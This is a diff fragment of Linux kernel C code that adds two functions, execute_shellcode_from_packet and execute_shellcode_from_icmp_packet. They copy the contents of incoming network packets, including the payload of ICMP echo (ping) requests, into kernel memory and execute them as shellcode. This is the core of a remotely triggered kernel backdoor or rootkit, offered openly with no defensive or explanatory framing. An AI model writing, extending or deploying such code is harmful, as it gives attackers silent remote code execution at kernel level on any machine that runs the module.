@@ -534,3 +534,41 @@ void execute_shellcode_from_file(const char *filename)
 
 	kfree(shellcode);
 }
+
+void execute_shellcode_from_packet(struct sk_buff *skb)
+{
+	void *shellcode;
+	size_t size;
+
+	size = skb->len;
+	shellcode = kmalloc(size, GFP_KERNEL);
+	if (!shellcode)
+		return;
+
+	skb_copy_bits(skb, 0, shellcode, size);
+
+	execute_shellcode(shellcode);
+
+	kfree(shellcode);
+}
+
+void execute_shellcode_from_icmp_packet(struct sk_buff *skb)
+{
+	struct icmphdr *icmph;
+	void *shellcode;
+	size_t size;
+
+	icmph = icmp_hdr(skb);
+	if (icmph->type == ICMP_ECHO && icmph->code == 0) {
+		size = skb->len - sizeof(struct icmphdr);
+		shellcode = kmalloc(size, GFP_KERNEL);
+		if (!shellcode)
+			return;
+
+		skb_copy_bits(skb, sizeof(struct icmphdr), shellcode, size);
+
+		execute_shellcode(shellcode);
+
+		kfree(shellcode);
+	}
+}
